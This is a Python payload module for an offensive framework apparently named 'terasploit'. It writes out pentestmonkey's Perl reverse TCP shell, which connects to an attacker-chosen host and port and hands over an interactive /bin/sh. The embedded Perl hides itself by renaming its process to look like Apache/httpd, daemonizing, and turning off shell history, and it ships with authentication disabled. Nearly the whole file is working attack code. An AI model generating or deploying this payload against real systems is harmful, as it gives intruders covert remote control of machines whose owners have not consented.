#######
# Module/Payload: Reverse Shell 
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.payload import *

class TerasploitModule(Payload):
    
    module_type = 'payload'
    
    def initialize(self,info_only: bool = False):
        update_info(
            {
                'Module' : 'payload',
                'Name' : 'reverse tcp shell perl',
                'Module Author' : 'Charlie (4steroth)',
                'Reverse Shell Author' : 'pentestmonkey',
                'Copyright' : 'Copyright (C) 2006 pentestmonkey@pentestmonkey.net',
                'Source' : 'https://github.com/pentestmonkey/perl-reverse-shell/blob/master/perl-reverse-shell.pl',
                'Type' : 'reverse_tcp',
                'Arch' : 'perl',
            
                'Description' : [
                    'perl reverse tcp shell'
                ],
            }
        )

        if info_only:
            return
    
        register_option ("payload",opt=[
            OptIP.new("lhost",[
                "","yes","target listening address"
            ]),
            OptPort.new("lport",[
                4444,"yes","target listening port"
            ])
        ])
        
        
    def run(self) -> tuple[str, bool]: 
        payload_content = self.shell_content()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['Type']
        info_print (f'Generating {shell_name}...')
        self.generate_file(shell_name,payload_arch,payload_content)
        info_print ('Shell generated!')
        info_print(f'Saved as {shell_name}.pl')
        return 'done', True
    

    def shell_content(self) -> str:
        lhost = Opt('payload').GetOPT('lhost')
        lport = Opt('payload').GetOPT('lport')
        
        return """
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";
my $ip = '""" + f"{lhost}" + """';
my $port = """ + f"{lport}" + """;
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";
$0 = "[httpd]";
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));
sub cgiprint {
	my $line = shift;
	$line .= "<p>\n";
	$global_page .= $line;
}
sub cgiexit {
	cgiprintpage();
	exit 0;
}
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}   
"""